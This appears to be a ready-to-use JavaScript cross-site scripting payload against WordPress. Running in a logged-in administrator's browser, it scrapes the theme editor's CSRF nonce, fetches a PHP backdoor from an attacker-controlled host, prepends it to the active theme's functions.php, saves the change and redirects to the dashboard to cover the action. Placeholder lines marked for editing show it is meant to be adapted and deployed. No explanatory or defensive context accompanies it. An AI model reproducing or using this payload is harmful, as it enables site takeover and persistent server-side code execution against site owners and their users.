const phpBdURL = 'http://192.168.5.5/bd.txt';  // !!! CHANGE THIS !!!
const themeName = 'twentytwentyfive';          // !!! CHANGE THIS !!!
const wpRoot = '';                             // !!! CHANGE THIS !!!
const wpThemeEditorPath = wpRoot + '/wp-admin/theme-editor.php';
const wpThemeEditorQuery = 'file=functions.php&theme=' + themeName;
const wpDashboardURL = wpRoot + '/wp-admin/index.php';
const req = new XMLHttpRequest();
req.open('GET', wpThemeEditorPath + '?' + wpThemeEditorQuery, false);
req.send(null);
const csrfToken = req.responseText.match(/input type="hidden" id="nonce" name="nonce" value="([^"]*?)"/)[1];
const content = req.responseText.match(/editor-keyboard-trap-help-3 editor-keyboard-trap-help-4">([^<]*?)<\/textarea>/)[1];
async function fetchPHPBd(phpBdURL) {
  const response = await fetch(phpBdURL);
  const bdContent = await response.text();
  return bdContent;
}
fetchPHPBd(phpBdURL).then(bdContent => {
  let phpBd = bdContent;
  function decodeEntity(inStr) {
    const textarea = document.createElement('textarea');
    textarea.innerHTML = inStr;
    return textarea.value;
  }
  const bodyData = 'nonce=' + csrfToken + '&newcontent=' + phpBd + encodeURIComponent(decodeEntity(content)) + '&action=edit-theme-plugin-file&file=functions.php&theme=' + themeName;
  req.open('POST', wpThemeEditorPath, true);
  req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  req.send(bodyData);
  req.onreadystatechange = function() {
    if (req.readyState == XMLHttpRequest.DONE) {
      window.location.replace(wpDashboardURL);
    }
  }
});
